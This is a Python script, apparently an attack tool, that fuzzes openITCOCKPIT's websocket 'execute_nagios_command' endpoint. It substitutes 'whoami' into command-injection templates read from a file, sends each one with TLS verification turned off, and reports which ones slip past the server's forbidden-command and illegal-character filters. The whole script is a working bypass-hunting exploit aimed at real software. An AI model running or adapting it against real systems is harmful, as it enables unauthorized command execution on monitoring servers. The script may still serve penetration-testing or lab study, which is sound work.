#!/usr/bin/env python3
import argparse
import websocket
import ssl 
import json
import time
import sys

uniqid = ""
key = ""

def parseMessage(message):
    m = json.loads(message)
    return m

def buildReq(task,data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key" : key
    }
    return json.dumps(req)

parser = argparse.ArgumentParser()

parser.add_argument('--url', '-u',
                    required=True,
                    dest='url',
                    help='Websocket URL')
parser.add_argument('--key', '-k',
                    required=True,
                    dest='key',
                    help='OpenITCOCKPIT Key')
parser.add_argument('--verbose', '-v',
                    help='Print more data',
                    action='store_true')

args = parser.parse_args()
key = args.key
websocket.enableTrace(args.verbose)

with open('command-injection-template.txt') as f:
   for line in f:
       #remove the newline
       cmd=line.rstrip()
       cmd=cmd.replace("{cmd}", "whoami")
       print("Trying: %s" % cmd, end="\r") #print and wipe
       ws = websocket.create_connection(args.url,sslopt={"cert_reqs": ssl.CERT_NONE})
       # Server makes first contact
       result =  parseMessage(ws.recv())
       # Server provides id to ensure request are unique
       if "uniqid" in result.keys():
           uniqid = result["uniqid"]
        #Send the command
       ws.send(buildReq("execute_nagios_command", cmd))
       
       # Loop trough responses until something hits (we don't know what a good response looks like)
       while True:
           try: # Key error might hit if there is no "payload" or "uniqid"
               result =  parseMessage(ws.recv())
               if uniqid == result["uniqid"]: #Check message received was for this request
                    if "Forbidden command" in result["payload"] or "This command contain illegal characters" in result["payload"]: # 
                       pass #If we hit here, the command is no good
                    else:
                       print("Found allowed command: %s" % cmd) #Command is good!
                    break
           except KeyError:
               pass # Ignore KeyErrors
       ws.close()
       sys.stdout.write("\033[K") #print and wipe